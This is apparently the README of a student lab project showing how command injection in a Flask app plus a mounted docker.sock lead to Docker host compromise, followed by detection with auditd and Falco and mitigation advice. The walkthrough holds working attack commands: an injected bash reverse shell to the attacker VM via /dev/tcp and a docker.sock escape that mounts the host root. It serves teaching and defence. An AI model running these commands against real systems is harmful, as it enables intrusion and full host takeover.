# Docker Escape - Attack & Detection

**Semester 4 College Project | OS & Cybersecurity**

A demonstration of how a common Docker misconfiguration (mounting `/var/run/docker.sock` into a container) combined with a command injection vulnerability in a web app leads to full host compromise. The project covers the attack, detection, and mitigation.

---

## Repo Structure

```
OS-Project/
|   README.md
|
+---host/
|       app.py          Flask app with the intentional command injection vulnerability
|       Dockerfile      Builds the NetDiag image, runs as root (intentional for demo)
|
+---report/
|       Docker_Escape_Report.docx
|       Docker_Escape_Report.pdf
|       Docker_Escape_Presentation_1.pptx
|       Docker_Escape_Presentation_1.pdf
|
+---screenshots/        Screenshots used in the presentation
|
+---scripts/
        setup.sh        Run on VM1 (victim) to build and start the vulnerable container
        attack.sh       Run on VM2 (attacker) to walk through the full attack chain
        detect.sh       Run on VM1 (victim) after the attack to demonstrate detection
```

---

## What This Is

A controlled lab environment running two Kali Linux VMs on a VirtualBox NAT Network. One VM runs a deliberately vulnerable Flask app called **NetDiag** inside Docker. The other acts as the attacker.

The attack chain:

```
Command Injection -> Reverse Shell -> docker.sock Abuse -> Host Compromise
```

No kernel exploits. No CVEs. Just two misconfigurations that are common in real deployments.

---

## Prerequisites

- Two Kali Linux VMs on the same VirtualBox NAT Network
- Docker installed on VM1 (setup.sh will install it if missing)
- Both VMs cloned from this repo

---

## Step 0 - Set Your IPs

Before running any script, open `scripts/setup.sh` and `scripts/attack.sh` and set the IP variables at the top to match your actual VM IPs:

```bash
# In setup.sh
VICTIM_IP="192.168.98.4"    # IP of VM1

# In attack.sh
VICTIM_IP="192.168.98.4"    # IP of VM1
ATTACKER_IP="192.168.98.5"  # IP of VM2
```

To find your IP on either VM:

```bash
ip a
```

Make the scripts executable on both VMs after cloning:

```bash
chmod +x scripts/setup.sh scripts/attack.sh scripts/detect.sh
```

---

## VM Layout

| VM   | Role                  | Default IP     |
|------|-----------------------|----------------|
| VM 1 | Victim (runs Docker)  | 192.168.98.4   |
| VM 2 | Attacker              | 192.168.98.5   |

---

## Running the Demo

### On VM1 - start the vulnerable environment

```bash
cd OS-Project
bash scripts/setup.sh
```

This builds the `netdiag` Docker image from `host/` and runs it with the intentional `docker.sock` misconfiguration. The app will be live at `http://<VICTIM_IP>:5000`.

### On VM2 - run the attack

```bash
cd OS-Project
bash scripts/attack.sh
```

This walks through the full attack chain step by step: confirming RCE, opening a reverse shell, and printing the exact commands needed to escape the container via docker.sock.

### On VM1 - demonstrate detection

```bash
cd OS-Project
bash scripts/detect.sh
```

Run this after the attack completes. It checks for proof of compromise, inspects the container mounts, sets up an auditd rule on docker.sock, and shows which processes are touching the socket.

---

## The Vulnerability

In `host/app.py`, the `/ping` route passes user input directly into a shell command:

```python
result = os.popen("ping -c 3 " + host).read()
```

No sanitization. Anything after a `;` runs as a separate shell command on the server.

---

## Attack Walkthrough

### 1. Confirm RCE

From VM2, visit:

```
http://192.168.98.4:5000/ping?host=8.8.8.8;id
```

Response includes `uid=0(root)` - you have remote code execution as root inside the container.

### 2. Get a Reverse Shell

Start a listener on VM2:

```bash
nc -lvnp 4444
```

Trigger the shell:

```bash
curl "http://192.168.98.4:5000/ping?host=8.8.8.8;bash+-c+'bash+-i+>%26+/dev/tcp/192.168.98.5/4444+0>%261'"
```

The browser hangs. VM2 receives the connection and you are now inside the container as root.

### 3. Stabilize the Shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
# Enter twice
```

### 4. Find the Socket

```bash
ls -la /var/run/docker.sock
# srw-rw---- 1 root 132 ... /var/run/docker.sock
```

The socket is bind-mounted. You now have direct access to the host Docker daemon.

### 5. Install Docker CLI and Escape

```bash
apt-get update && apt-get install -y docker.io

docker -H unix:///var/run/docker.sock run -d \
  -v /:/hostfs --rm alpine \
  chroot /hostfs sh -c 'echo pwned > /tmp/escaped.txt'
```

### 6. Verify Host Compromise

On VM1, outside any container:

```bash
cat /tmp/escaped.txt
# pwned
```

Written from inside a container, readable on the real host. Full compromise.

---

## Detection

```bash
# Check what is mounted in the container
docker inspect netdiag-app | grep -A 5 "Mounts"

# Monitor docker.sock access with auditd
auditctl -w /var/run/docker.sock -p rwxa -k docker_sock
ausearch -k docker_sock
```

Falco also has built-in rules that fire the moment docker.sock is accessed from inside a container - "Sensitive mount in container" and "Container with docker.sock mount".

---

## Mitigation

**Never do this in production:**

```bash
docker run -v /var/run/docker.sock:/var/run/docker.sock ...
```

**Fixes:**

- Use **rootless Docker** - daemon does not run as root
- Use **Podman** - no daemon, no socket attack surface
- If docker.sock access is genuinely needed, use **Docker Socket Proxy** (Tecnativa) to restrict which API calls are allowed
- Fix the code - replace `os.popen()` with `subprocess.run(['ping', '-c', '3', host])` so user input never touches the shell

---

## Quick Reference

| Step          | Machine           | Command                                                                 |
|---------------|-------------------|-------------------------------------------------------------------------|
| Set IPs       | Both VMs          | Edit `VICTIM_IP` / `ATTACKER_IP` at top of each script                 |
| Make scripts executable | Both VMs | `chmod +x scripts/*.sh`                                              |
| Start victim  | VM1               | `bash scripts/setup.sh`                                                 |
| Run attack    | VM2               | `bash scripts/attack.sh`                                                |
| Detect        | VM1               | `bash scripts/detect.sh`                                                |
| Trigger RCE   | VM2 (browser)     | `http://<VICTIM_IP>:5000/ping?host=8.8.8.8;id`                         |
| Find sock     | VM2 (container)   | `ls -la /var/run/docker.sock`                                           |
| Escape        | VM2 (container)   | `docker -H unix:///var/run/docker.sock run -d -v /:/hostfs --rm alpine chroot /hostfs sh -c '...'` |
| Prove access  | VM1 (host)        | `cat /tmp/escaped.txt`                                                  |

---

*Zala Vishmayraj Jagjitsingh | 241370107071 | GTU-SET | Semester 4*